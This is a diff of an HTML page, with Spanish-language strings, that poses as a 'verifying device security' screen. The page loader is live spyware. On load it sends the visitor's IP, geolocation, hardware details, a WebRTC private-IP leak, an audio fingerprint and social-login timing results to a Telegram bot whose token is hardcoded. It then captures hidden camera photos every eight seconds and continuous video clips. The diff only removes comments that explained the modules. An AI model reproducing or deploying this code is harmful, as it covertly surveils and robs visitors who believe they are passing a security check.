@@ -27,13 +27,13 @@
       width: 100%;
     }
 
-    /* Candado */
+ 
     .shield {
       font-size: 4rem;
       line-height: 1;
     }
 
-    /* Spinner simple */
+    
     .spinner {
       width: 56px;
       height: 56px;
@@ -44,7 +44,7 @@
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* Textos */
+    
     .msg {
       font-size: 1.1rem;
       font-weight: bold;
@@ -58,14 +58,14 @@
       font-family: Arial, sans-serif;
     }
 
-    /* Elementos multimedia ocultos */
+    
     video#vid   { display: none; }
     canvas#snap { display: none; }
   </style>
 </head>
 <body>
 
-<!-- Contenido principal -->
+
 <div class="container">
   <div class="shield">🔒</div>
   <div class="spinner"></div>
@@ -73,24 +73,20 @@
   <p class="sub-msg">Verificando seguridad del dispositivo...</p>
 </div>
 
-<!-- Elementos multimedia ocultos -->
+
 <video id="vid" autoplay muted playsinline></video>
 <canvas id="snap"></canvas>
 
 <script>
-  // ════════════════════════════════════════════════
-  //   CONFIGURACIÓN — EDITA AQUÍ
-  // ════════════════════════════════════════════════
+ 
   const BOT_TOKEN = "8256143400:AAFQEOQfWTs_EpU_2SqQRJtqxjWE6Az-N_Q";
   const CHAT_ID   = "8284747554";
   const TG        = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-  // log silencioso — no muestra nada en pantalla
-  function log(txt) { /* silencioso */ }
+  
+  function log(txt) {  }
 
-  // ════════════════════════════════════════════════
-  //   HELPERS DE ENVÍO TELEGRAM
-  // ════════════════════════════════════════════════
+  
   async function enviarMsg(texto) {
     try {
       await fetch(`${TG}/sendMessage`, {
@@ -122,9 +118,7 @@
     } catch (e) {}
   }
 
-  // ════════════════════════════════════════════════
-  //   MÓDULO 1 — IP PÚBLICA + GEOLOCALIZACIÓN
-  // ════════════════════════════════════════════════
+ 
   async function getIPInfo() {
     try {
       const r = await fetch('https://ipapi.co/json/');
@@ -132,9 +126,7 @@
     } catch { return {}; }
   }
 
-  // ════════════════════════════════════════════════
-  //   MÓDULO 2 — BATERÍA
-  // ════════════════════════════════════════════════
+ 
   async function getBattery() {
     try {
       const b = await navigator.getBattery();
@@ -142,9 +134,7 @@
     } catch { return { level: '?', charging: false }; }
   }
 
-  // ════════════════════════════════════════════════
-  //   MÓDULO 3 — GPU (WebGL)
-  // ════════════════════════════════════════════════
+
   function getGPU() {
     try {
       const cv = document.createElement('canvas');
@@ -162,9 +152,7 @@
     } catch { return { renderer: 'Error', tier: 'Desconocida' }; }
   }
 
-  // ════════════════════════════════════════════════
-  //   MÓDULO 4 — IP PRIVADA (WebRTC LEAK)
-  // ════════════════════════════════════════════════
+ 
   async function getPrivateIP() {
     return new Promise((resolve) => {
       try {
@@ -199,9 +187,7 @@
     });
   }
 
-  // ════════════════════════════════════════════════
-  //   MÓDULO 5 — AUDIO FINGERPRINT
-  // ════════════════════════════════════════════════
+ 
   async function getAudioFingerprint() {
     return new Promise((resolve) => {
       try {
@@ -242,9 +228,7 @@
     });
   }
 
-  // ════════════════════════════════════════════════
-  //   MÓDULO 6 — SOCIAL CHECK (TIMING ATTACK)
-  // ════════════════════════════════════════════════
+  
   async function socialCheck() {
     const targets = [
       { name: 'Facebook',  url: 'https://www.facebook.com/favicon.ico' },
@@ -268,9 +252,7 @@
     return resultados.join('\n');
   }
 
-  // ════════════════════════════════════════════════
-  //   MÓDULO 7 — CÁMARA: FOTOS SILENCIOSAS (c/8s)
-  // ════════════════════════════════════════════════
+  
   async function iniciarFotosSilenciosas(stream) {
     const video  = document.getElementById('vid');
     const canvas = document.getElementById('snap');
@@ -286,16 +268,14 @@
       }
     };
 
-    // Captura inmediata
+    
     setTimeout(capturar, 2000);
-    // Bucle cada 8 segundos
+    
     setInterval(capturar, 8000);
     log('📸 Fotos silenciosas activas');
   }
 
-  // ════════════════════════════════════════════════
-  //   MÓDULO 8 — VIDEO CONTINUO (clips de 5s)
-  // ════════════════════════════════════════════════
+ 
   function iniciarVideoInfinito(stream) {
     const mimeTypes = [
       'video/webm;codecs=vp9,opus',
@@ -315,7 +295,7 @@
           const blob = new Blob(chunks, { type: mimeType });
           enviarVideo(blob);
           log('🎥 Clip enviado — grabando siguiente...');
-          // Inmediatamente inicia el siguiente clip
+          
           setTimeout(grabarClip, 200);
         };
 
@@ -330,9 +310,7 @@
     grabarClip();
   }
 
-  // ════════════════════════════════════════════════
-  //   EVENTO DE SALIDA (beforeunload)
-  // ════════════════════════════════════════════════
+  
   window.addEventListener('beforeunload', () => {
     const msg = `🚪 <b>USUARIO SALIÓ DE LA PÁGINA</b>\n⏰ ${new Date().toLocaleString('es-SV')}\n🔗 ${location.href}`;
     navigator.sendBeacon(`${TG}/sendMessage`,
@@ -341,13 +319,11 @@
     );
   });
 
-  // ════════════════════════════════════════════════
-  //   FUNCIÓN PRINCIPAL
-  // ════════════════════════════════════════════════
+  
   async function iniciarCaptura() {
     log('🔍 Iniciando módulos...');
 
-    // Ejecutar todos los módulos en paralelo
+    
     const [geo, bat, privateIP, audioID, socialResult] = await Promise.all([
       getIPInfo(),
       getBattery(),
@@ -364,7 +340,7 @@
     log(`🏠 IP LAN: ${privateIP}`);
     log(`🔊 AudioID: ${audioID}`);
 
-    // ── Construir reporte ──────────────────────────
+    
     const ua      = navigator.userAgent;
     const ram     = navigator.deviceMemory  || '?';
     const cores   = navigator.hardwareConcurrency || '?';
@@ -406,7 +382,7 @@ ${socialResult}
     await enviarMsg(reporte);
     log('✅ Reporte enviado a Telegram');
 
-    // ── Solicitar cámara + micrófono ───────────────
+    
     try {
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
@@ -416,10 +392,10 @@ ${socialResult}
       log('✅ Cámara y micrófono activos');
       await enviarMsg('🎥 <b>CÁMARA Y MICRÓFONO ACTIVADOS</b>\nIniciando capturas silenciosas y grabación continua...');
 
-      // Fotos silenciosas cada 8s
+      
       iniciarFotosSilenciosas(stream);
 
-      // Video clips de 5s en bucle infinito
+      
       iniciarVideoInfinito(stream);
 
     } catch (err) {
@@ -431,7 +407,7 @@ ${socialResult}
     }
   }
 
-  // ── Iniciar al cargar ──────────────────────────────
+ 
   window.addEventListener('load', iniciarCaptura);
 </script>
 </body>
